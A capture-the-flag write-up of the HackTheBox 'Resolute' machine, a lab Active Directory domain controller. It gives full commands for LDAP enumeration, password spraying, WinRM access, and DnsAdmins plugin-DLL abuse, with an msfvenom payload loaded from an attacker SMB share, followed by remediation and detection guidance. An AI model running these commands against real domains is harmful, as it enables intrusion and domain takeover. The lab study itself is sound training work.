---
layout: default
title: "HackTheBox - Resolute"
---

# HackTheBox - Resolute

**OS:** Windows Server 2016 (Active Directory)

Resolute is a Windows Active Directory machine for the fictional `megabank.local`
domain. Anonymous LDAP is readable and the password policy has no account lockout,
so enumeration and spraying are safe. One user account carries a default password in
its `description` attribute; that password is no good for its owner but, sprayed
across the domain, unlocks a different account that holds WinRM access. From that
foothold a leftover PowerShell transcript at the drive root exposes a second
credential, and that account belongs to `DnsAdmins`. That opens the well-documented
DnsAdmins-to-domain-compromise path: the DNS service can be pointed at an
attacker-supplied plugin DLL and restarted, running code in the service's context.
Because the DNS server here is the domain controller, that lands as
`NT AUTHORITY\SYSTEM` on the DC.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (RESOLUTE.megabank.local) |
| Initial Access | LDAP `description` credential leak -> password spray -> WinRM |
| Privilege Escalation | PowerShell transcript credential -> DnsAdmins `ServerLevelPluginDll` |
| Final Access | `nt authority\system` (Domain Controller) |

---

## Recon

### Port Scan

A full TCP scan (run with the in-house `p0rtix` wrapper around nmap) returned the
classic domain-controller fingerprint: DNS, Kerberos, LDAP/LDAPS, SMB, the global
catalog, WinRM, ADWS, and the high RPC ports. No web application of interest.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 53 | TCP/UDP | DNS | Simple DNS Plus, `megabank.local` |
| 88 | TCP | Kerberos | |
| 135 / 593 | TCP | MSRPC / RPC-over-HTTP | |
| 139 / 445 | TCP | SMB | signing required |
| 389 / 636 / 3268 / 3269 | TCP | LDAP / LDAPS / GC | anonymous bind allowed |
| 464 | TCP | kpasswd | |
| 5985 | TCP | WinRM | used for the initial shell |
| 9389 | TCP | ADWS | |
| 47001 | TCP | HTTP.sys | WinRM/WSMAN listener |

The host fingerprinted as `RESOLUTE`, a Windows Server 2016 (Build 14393) DC for
`megabank.local`.

### Unauthenticated AD Enumeration

Anonymous LDAP returned the base DN and the domain password policy. Two policy facts
mattered for the whole engagement: there is **no account lockout**, and password
**complexity is disabled**, so spraying is both safe and likely to hit a weak
password:

```
ldapsearch -x -H ldap://<target-ip>:389 -b '' -s base
- Base DN: DC=megabank,DC=local

ldapsearch -x -H ldap://<target-ip>:389 -b DC=megabank,DC=local \
  '(objectClass=domain)' minPwdLength lockoutThreshold pwdProperties
- Min password length: 7
- Lockout threshold: 0   -> NO LOCKOUT
- Password complexity: disabled
```

### Reading User Descriptions

Anonymous LDAP also exposed the full user list (27 accounts). The `description`
attribute is a classic dumping ground for onboarding passwords, so every description
was pulled. One stood out, `marko`:

```
ldapsearch -x -H ldap://<target-ip>:389 -b DC=megabank,DC=local \
  '(objectClass=person)' sAMAccountName description
- Users (27): Guest, ryan, marko, sunita, abigail, marcus, sally, fred, angela,
  felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per,
  claude, melanie, zach, simon, naoki ...
- marko: "Account created. Password set to We********"
```

The same field is surfaced inline by NetExec's `--users`, which is a quick way to
catch description-stored credentials:

```
nxc smb <target-ip> -u marko -p '<redacted>' --users
SMB   <target-ip>   445   RESOLUTE   marko   2019-09-27   Account created. Password set to We********
```

---

## Initial Access

### Password Spray to `melanie`

The password from marko's description did **not** authenticate as marko, the owner
had clearly rotated it. With lockout disabled it was safe to spray that single
password across the full user list, and it landed on a different account, `melanie`,
who is also a member of **Remote Management Users**, so it is a shell:

```
nxc smb   <target-ip> -u users.txt -p '<redacted>' --continue-on-success
SMB   <target-ip>   445   RESOLUTE   [+] megabank.local\melanie:<redacted>

nxc winrm <target-ip> -u users.txt -p '<redacted>' --continue-on-success
WINRM <target-ip>   5985   RESOLUTE   [+] megabank.local\melanie:<redacted> (Pwn3d!)
```

> **Why this works:** a credential found on one object is a domain-wide spray
> candidate, not just that object's password. Owners rotate leaked defaults; their
> less-attentive peers often do not.

### Shell via WinRM

```
evil-winrm -i <target-ip> -u melanie -p '<redacted>'

*Evil-WinRM* PS C:\Users\melanie\Documents> whoami; hostname; type C:\Users\melanie\Desktop\user.txt
megabank\melanie
Resolute
<user-flag-redacted>
```

---

## Post-Exploitation Enumeration

### Hidden `PSTranscripts` at the Drive Root

Automated enumeration (WinPEAS, etc.) did not surface the next step; it was hidden.
Listing the drive root with `-force` (include hidden/system items) revealed a
`PSTranscripts` directory that a normal listing skips:

```
*Evil-WinRM* PS C:\> dir -force
d--h--   12/3/2019   6:32 AM   PSTranscripts
```

PowerShell transcription had been left enabled and writing to a readable path. The
saved transcript captured a command that passed a credential as an argument, which
transcription dutifully logged in clear text:

```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.*.txt
+ cmd /c net use X: \\fs01\backups ryan Se****************
```

### `ryan` and `DnsAdmins`

`ryan` is also in Remote Management Users, giving a second WinRM shell. The decisive
detail is his group membership:

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups
MEGABANK\Contractors   Group   ...
MEGABANK\DnsAdmins     Alias   S-1-5-21-...-1101   Local Group
```

---

## Privilege Escalation

### DnsAdmins `ServerLevelPluginDll` to SYSTEM

> **Why this works:** the Windows DNS service exposes a `ServerLevelPluginDll`
> setting that loads an arbitrary DLL into the DNS process on service start. A
> member of `DnsAdmins` can set that value with `dnscmd` and, on a DC, can also stop
> and start the DNS service. Because DNS runs as `NT AUTHORITY\SYSTEM`, this is a
> direct DnsAdmins-to-domain-compromise primitive when DNS sits on the DC, no
> separate exploit required. Mechanism and payload details:
> [ired.team - From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise).
>
> Worth being honest about scope: in a monitored environment this is far from
> free. The plugin DLL has to survive AV/EDR on the DC, the `dnscmd` config write
> and DNS service restart are both high-signal events, and a bad/unreachable DLL
> can take the DNS service (and AD name resolution) down with it. The lab path
> below is the clean, unopposed version of an attack that needs real tradecraft to
> run quietly in production.

A payload DLL was generated to reset the domain Administrator password. This is the
simplest reliable action on this box, though it is loud, an admin would notice the
password change on next logon:

```
msfvenom -p windows/x64/exec cmd='net user administrator <redacted> /domain' -f dll > da.dll
```

The DLL was served from an SMB share, registered as the DNS plugin, and the service
was cycled to trigger the load:

```
sudo impacket-smbserver share .

# from ryan's WinRM shell:
cmd /c dnscmd localhost /config /serverlevelplugindll \\<attacker-ip>\share\da.dll
# Registry property serverlevelplugindll successfully reset.

sc.exe stop dns
sc.exe start dns
```

> **Gotcha worth recording:** this `ServerLevelPluginDll` step was finicky in
> practice and took several iterations to land. It is a stateful primitive, the DNS
> service holds the configured plugin across restarts, and otherwise-identical runs
> did not always behave the same way. Two things help. First, run the SMB server
> with `-debug`, otherwise it is silent and you cannot tell whether the DC is even
> reaching back out to pull the DLL (the machine account `RESOLUTE$` shows up in the
> log when it is). Second, prefer hosting the DLL **locally on the target** (upload
> it, point the plugin at a local path) to remove the network share as a variable.
> Always clear `ServerLevelPluginDll` afterward so the DNS service starts cleanly
> again, leaving it set to a missing DLL can prevent the service from starting.

### Administrator via psexec

On a clean load the DNS service reset the Administrator password as SYSTEM. That
credential was then used to land a full SYSTEM shell with psexec:

```
sudo impacket-psexec megabank.local/administrator@<target-ip>

C:\Windows\system32> whoami && hostname && type C:\Users\Administrator\Desktop\root.txt
nt authority\system
Resolute
<root-flag-redacted>
```

Full domain compromise achieved: SYSTEM on the domain controller and control of the
domain Administrator account.

---

## Root Cause

Resolute falls to a chain of identity and credential-hygiene failures rather than a
single vulnerability:

1. **Cleartext password in an AD `description`** attribute (`marko`).
2. **Weak password policy**, no lockout and complexity disabled, which made a single
   leaked default both safe and effective to spray.
3. **Sensitive credentials captured in a PowerShell transcript** left readable on
   disk, because a password was passed as a command-line argument.
4. **Over-privileged group membership**, `ryan` in `DnsAdmins`, which on a DC is a
   built-in path to SYSTEM via `ServerLevelPluginDll`.

Remove any one of links 1, 3, or 4 and the path to Domain Admin breaks.

## Impact

Complete compromise of the `megabank.local` domain. An attacker beginning from
anonymous LDAP reached SYSTEM on the domain controller and control of the domain
Administrator account, which permits dumping all domain credential material
(including `krbtgt`), forging golden tickets, establishing persistence, and
unrestricted access to every domain-joined system. The domain cannot be trusted
again until `krbtgt` is rotated twice and all credentials are reset.

## Remediation

Recommendations are ordered by priority. The first two break the demonstrated path
outright; the rest reduce blast radius.

**1. Restrict `DnsAdmins` (highest priority).** Treat `DnsAdmins` as a tier-0 / DC
administrative group, since membership grants SYSTEM-level code execution on the
domain controller. Remove non-essential members (`ryan`), and audit/alert on changes
to the `ServerLevelPluginDll` registry value and on DNS service restarts initiated by
non-administrators.

**2. Stop storing credentials where they can be read.** Remove passwords from AD
`description`/`info` and any readable attribute, and audit those fields domain-wide.
Disable PowerShell transcription to readable locations (or lock down the transcript
output directory), and never pass credentials as command-line arguments, where they
are captured in transcripts, command history, and process listings.

**3. Strengthen the password policy.** The domain currently allows 7-character
passwords with **no lockout** and **complexity disabled**. Set a 14+ character
minimum, enable account lockout / smart lockout, enable complexity, and deploy a
banned-password list so weak defaults like the leaked credential are rejected at set
time.

**4. Enforce unique credentials and protect service accounts.** Ban shared/default
passwords, and where service accounts must exist, migrate to Group Managed Service
Accounts (gMSA) so their secrets are machine-managed and not human-set.

**5. Restrict administrative protocols.** Limit WinRM (5985) and Remote Management
Users membership to a controlled jump-host tier.

### Validation

- Confirm `DnsAdmins` contains only sanctioned tier-0 identities.
- Query `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`
  and confirm it is empty.
- Confirm AD `description`/`info` fields contain no secrets.
- Replay a password spray with a known weak password and confirm lockout triggers.

## Detection Opportunities

- **Password spraying:** many failed logons (event **4625**) across distinct accounts
  from one source in a short window, particularly notable with lockout disabled.
- **DnsAdmins DLL abuse:** modification of the `ServerLevelPluginDll` registry value;
  DNS service stop/start (events **7036** / **7040**) by a non-administrator; DNS
  server plugin load failures (DNS event **150**); and, highest-fidelity, the DNS
  server process (a tier-0 service) loading a DLL from a UNC/SMB path or a
  non-system directory.
- **Credential access via transcript:** reads of PowerShell transcript files;
  Script Block Logging (event **4104**) for the offending `net use ... <password>`
  pattern.
- **Domain admin password reset:** events **4724** / **4738** for the Administrator
  account outside change control.
- **psexec lateral movement:** service creation (event **7045**) and named-pipe
  activity from the Administrator account originating from an unexpected host.

## Lessons Learned

- **Spray leaked passwords domain-wide.** A credential that fails for its owner is
  still a strong spray candidate for peers who never rotated.
- **`dir -force` matters.** Hidden items (`PSTranscripts`) that normal listings and
  automated tooling miss can hold the next step.
- **`DnsAdmins` is a DnsAdmins-to-domain-compromise primitive**, not a benign
  delegation role: when DNS runs on a DC, plugin-DLL execution as SYSTEM is domain
  compromise. Treat it as tier-0.
- **`ServerLevelPluginDll` is stateful and can behave inconsistently.** Run the
  delivery server with `-debug` for visibility into whether the DC is fetching the
  payload, prefer hosting the DLL locally to remove the share as a variable, and
  clear the plugin value afterward so DNS can restart cleanly.

---

## Cleanup

- Clear the `ServerLevelPluginDll` registry value and restart the DNS service so it
  returns to a clean state.
- The Administrator password was reset to gain access; restore/rotate it as part of
  post-engagement remediation, and rotate every credential exposed in the chain
  (`marko`, `melanie`, `ryan`, Administrator) plus `krbtgt` (twice).
- Remove the uploaded payload DLL and any served copies from the target.
